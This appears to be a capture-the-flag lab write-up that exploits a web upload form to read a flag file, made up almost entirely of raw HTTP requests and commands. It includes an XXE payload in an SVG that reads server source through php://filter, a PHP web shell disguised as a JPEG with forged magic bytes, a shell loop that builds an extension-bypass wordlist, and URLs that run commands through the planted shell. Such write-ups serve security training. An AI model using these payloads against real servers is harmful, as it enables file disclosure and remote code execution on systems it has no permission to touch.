Try to exploit the upload form to read the flag found at the root directory "/".

1. Read source code
```
POST /contact/upload.php HTTP/1.1
Host: 94.237.123.185:38137
Content-Length: 343
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN2gRQivjEa0kQtRe
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Origin: http://94.237.123.185:38137
Referer: http://94.237.123.185:38137/contact/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryN2gRQivjEa0kQtRe
Content-Disposition: form-data; name="uploadFile"; filename="shell.svg"
Content-Type: image/png

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>

------WebKitFormBoundaryN2gRQivjEa0kQtRe--
```
- Decode as Base64
- Shows that files are uploaded to IP/contact/user_feedback_submissions/ymd_filename
- ymd = 251205 for December 5, 2025

2. Run Burp Suite Intruder to find files that upload
```
POST /contact/upload.php HTTP/1.1
Host: 83.136.251.11:37204
Content-Length: 34778
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoIvS6DVKltyXFErL
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Origin: http://83.136.251.11:37204
Referer: http://83.136.251.11:37204/contact/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryoIvS6DVKltyXFErL
Content-Disposition: form-data; name="uploadFile"; filename="$asd.jpg$"
Content-Type: image/jpeg

ÿØ
<?php system($_GET['cmd']); ?>
ÿÙ
------WebKitFormBoundaryoIvS6DVKltyXFErL--
```
- Magic bytes for jpg start with 'ff d8' and end with 'ff d9'
Wordlist:
```
for ext in '.php' '.phps' '.phar' '.phtml'; do
  echo "shell$char$ext.jpg" >> wordlist.txt
  echo "shell$ext$char.jpg" >> wordlist.txt
  echo "shell.jpg$char$ext" >> wordlist.txt
  echo "shell.jpg$ext$char" >> wordlist.txt
done
```

3. Visit the URL
```
http://83.136.251.11:37204/contact/user_feedback_submissions/251205_shell.phar.jpg?cmd=ls%20/
http://83.136.251.11:37204/contact/user_feedback_submissions/251205_shell.phar.jpg?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
```
